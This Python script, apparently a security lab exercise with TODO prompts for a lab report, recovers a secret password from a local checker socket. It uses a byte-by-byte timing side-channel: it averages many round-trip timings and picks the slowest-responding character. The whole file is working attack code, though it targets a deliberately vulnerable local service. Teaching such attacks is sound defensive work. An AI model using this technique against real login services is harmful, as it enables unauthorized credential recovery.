import socket, time, statistics, string
SOCK_PATH = "/tmp/passwordchecker.sock"

"""TODO: This is the max amount if recommended trials.
In your lab report, talk about what will happen
if the trial count goes lower? What do you see?"""
TRIALS = 120

"""TODO: Fill in the alphabet"""
ALPHABET = string.ascii_letters + string.digits + string.punctuation


def _robust_mean(samples, trim_ratio=0.1):
    """Return a trimmed mean to reduce the impact of outliers.

    samples: list of float timings
    trim_ratio: fraction to trim from each tail (0.0-0.5)
    """
    if not samples:
        return 0.0

    samples_sorted = sorted(samples)
    n = len(samples_sorted)
    k = int(n * trim_ratio)
    if k * 2 >= n:
        # Not enough samples to trim; fall back to simple mean
        return statistics.mean(samples_sorted)

    trimmed = samples_sorted[k:n - k]
    return statistics.mean(trimmed)


def measure(candidate: bytes) -> float:
    """Measure the average round-trip time for a candidate password.

    Creates a new UNIX socket connection for each trial, sends the
    candidate bytes, waits for the server's response, and records
    the elapsed time. Returns a robust average of all trials.
    """

    timings = []

    for _ in range(TRIALS):
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            start = time.perf_counter()
            s.connect(SOCK_PATH)
            s.sendall(candidate)
            # Read the single-byte response so we capture full RTT
            _ = s.recv(1)
            end = time.perf_counter()
            timings.append(end - start)

    return _robust_mean(timings)


def recover(max_len=7):
    """Recover the secret password using a timing side-channel.

    Iteratively guesses each byte by trying all characters in
    ALPHABET and selecting the one with the highest measured
    average round-trip time.
    """

    recovered = b""

    for position in range(max_len):
        best_char = None
        best_time = -1.0
        measurements = {}

        print(f"[*] Recovering byte {position + 1}/{max_len}...")

        for ch in ALPHABET:
            candidate = recovered + ch.encode()
            avg_time = measure(candidate)
            measurements[ch] = avg_time

            if avg_time > best_time:
                best_time = avg_time
                best_char = ch

            print(f"    Tried '{ch}': {avg_time:.6f} seconds")

        recovered += best_char.encode()
        print(f"[+] Best guess so far: {recovered!r}\n")

        # Optional: check if we've already found the correct password
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(SOCK_PATH)
            s.sendall(recovered)
            response = s.recv(1)
            if response == b"1":
                print(f"[+] Recovered full password: {recovered!r}")
                return recovered

    print(f"[!] Reached max_len; best guess: {recovered!r}")
    return recovered

if __name__=="__main__":
    recover()
